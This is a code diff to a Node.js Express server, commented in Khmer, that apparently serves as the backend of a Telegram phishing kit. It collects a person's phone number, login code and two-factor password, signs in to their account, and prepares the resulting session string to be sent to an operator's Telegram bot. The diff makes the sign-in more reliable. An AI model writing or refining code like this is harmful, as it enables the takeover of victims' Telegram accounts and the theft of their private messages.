@@ -2,7 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
-const { TelegramClient, Api } = require('telegram');
+const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
 
 const app = express();
@@ -70,25 +70,18 @@ app.post('/api/verify-code', async (req, res) => {
     try {
         const { client, phoneCodeHash } = session;
 
-        // ប្រសិនបើមានផ្ញើ 2FA Password មក
-        if (password) {
-            await client.checkPassword({ password: password });
-        } else {
-            // SignIn ជាមួយ OTP ធម្មតា
-            await client.invoke(
-                new Api.auth.SignIn({
-                    phoneNumber: phoneNumber,
-                    phoneCodeHash: phoneCodeHash,
-                    phoneCode: code,
-                })
-            );
-        }
+        // ប្រើ client.signIn ដើម្បី Verification ទាំង OTP និង 2FA Password
+        await client.signIn({
+            phoneNumber: phoneNumber,
+            phoneCodeHash: phoneCodeHash,
+            phoneCode: code,
+            password: password ? async () => password : undefined,
+        });
 
-        // បង្កើត Session String បន្ទាប់ពី Sign In ជោគជ័យ
         const sessionString = client.session.save();
-        delete sessions[phoneNumber];
+        delete sessions[phoneNumber]; // សម្អាត Session
 
-        // ផ្ញើ Session String និង លេខទូរស័ព្ទ ចូលទៅ Telegram Bot របស់អ្នក
+        // ផ្ញើ Session String ចូល Telegram Bot
         if (botToken && adminChatId) {
             try {
                 const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
